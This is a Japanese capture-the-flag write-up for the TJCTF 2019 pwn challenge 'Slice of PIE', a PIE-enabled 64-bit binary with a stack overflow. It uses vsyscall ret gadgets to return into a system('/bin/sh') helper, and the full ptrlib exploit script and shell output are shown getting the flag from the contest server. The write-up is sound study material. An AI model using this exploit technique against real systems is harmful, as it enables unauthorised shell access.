# [pwn 100pts] Slice of PIE - TJCTF 2019
64bitでPIEが有効ですがSSPは無効です。
```
$ checksec 82c4a8c15b444038fd38a6d4ba38c28fae383fd12867ba98920688947ae10803_slice_of_pie
[*] '82c4a8c15b444038fd38a6d4ba38c28fae383fd12867ba98920688947ae10803_slice_of_pie'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP disabled (No canary found)
    RELRO:	Full RELRO
    PIE:	PIE enabled
```
IDAで解析しましょう。

まずLengthを聞かれるのですが、ここで入力する値は下位3ビットが0である必要があります。
つまり、8の倍数であれば受け付けてくれます。

その後ローカルバッファにLengthバイトだけreadしてくれるので、スタックオーバーフローがあります。
また、オーバーフローは0x9B3の関数で起き、リターンアドレスは0xB09ですが、0x9A0に`system("/bin/sh")`を呼び出す補助関数があります。
~~ということで、リターンアドレスの下位2バイトを適当に"\xA0\x19"とでもしておけば確率的にシェルが呼び出せるはずです。~~
8バイト単位しか送れないのでこれではダメです。

割と分からなかったので調べました。
どうやらvsyscallなるものが使えるようです。
x64における機能らしく、vsyscallはASLRの有無に関わらず次のように0xffffffffff600000に居座っています。
```
    0x555555554000     0x555555555000 r-xp     1000 0      /home/ptr/colony/writeups/2019/TJCTF_2019/Slice_of_PIE/82c4a8c15b444038fd38a6d4ba38c28fae383fd12867ba98920688947ae10803_slice_of_pie
    0x555555754000     0x555555755000 r--p     1000 0      /home/ptr/colony/writeups/2019/TJCTF_2019/Slice_of_PIE/82c4a8c15b444038fd38a6d4ba38c28fae383fd12867ba98920688947ae10803_slice_of_pie
    0x555555755000     0x555555756000 rw-p     1000 1000   /home/ptr/colony/writeups/2019/TJCTF_2019/Slice_of_PIE/82c4a8c15b444038fd38a6d4ba38c28fae383fd12867ba98920688947ae10803_slice_of_pie
    0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7bcb000     0x7ffff7dcb000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000 0      
    0x7ffff7dd5000     0x7ffff7dfc000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7fd9000     0x7ffff7fdb000 rw-p     2000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```
残念ながらvsyscallで使えるgadgetは昔のパッチによりほとんど消え去ったようですが、次の3命令は使えます。
```
pwndbg> x/4i 0xffffffffff600000
   0xffffffffff600000:	mov    rax,0x60
   0xffffffffff600007:	syscall 
   0xffffffffff600009:	ret    
   0xffffffffff60000a:	int3
```

main関数で補助関数のアドレスをスタック上に置いているので、そこまでをret gadgetで埋めてやれば良さそうです。

注意する必要があるのが、0xffffffffff600009を指定してretを直接呼び出そうとすると次のようにバレてしまいます。
```
[ 4201.591260] 82c4a8c15b44403[8426] misaligned vsyscall (exploit attempt or buggy program) -- look up the vsyscall kernel parameter if you need a workaround ip:ffffffffff600009 cs:33 sp:7fff0450e390 ax:0 si:7fff0450e370 di:0
```


まだ本番サーバーが生きてたので試せました。やったー。
```python
from ptrlib import *

sock = Socket("p1.tjctf.org", 8004)
#sock = Process("./82c4a8c15b444038fd38a6d4ba38c28fae383fd12867ba98920688947ae10803_slice_of_pie")

vsyscall_ret = 0xffffffffff600000

payload = b'A' * 0x18
payload += p64(vsyscall_ret)
payload += p64(vsyscall_ret)

sock.recvuntil("Length: ")
sock.sendline(str(len(payload)))
sock.recvuntil("Input: ")
sock.sendline(payload)
sock.interactive()
```

```
$ python solve.py 
[+] Socket: Successfully connected to p1.tjctf.org:8004

[ptrlib]$ [ptrlib]$ ls  
[ptrlib]$ flag.txt
slice_of_pie
wrapper
cat flag.txt
[ptrlib]$ 
tjctf{1snt_vsysc4l1_gr8?}[ptrlib]$ 
```

# 感想
使いどころはまぁまぁ限られていますが、Stack系で全く知らなかったところなので、非常に勉強になりました。

# 参考文献
[1] [https://github.com/zst-ctf/tjctf-2019-writeups/tree/master/Writeups/Slice_of_PIE](https://github.com/zst-ctf/tjctf-2019-writeups/tree/master/Writeups/Slice_of_PIE)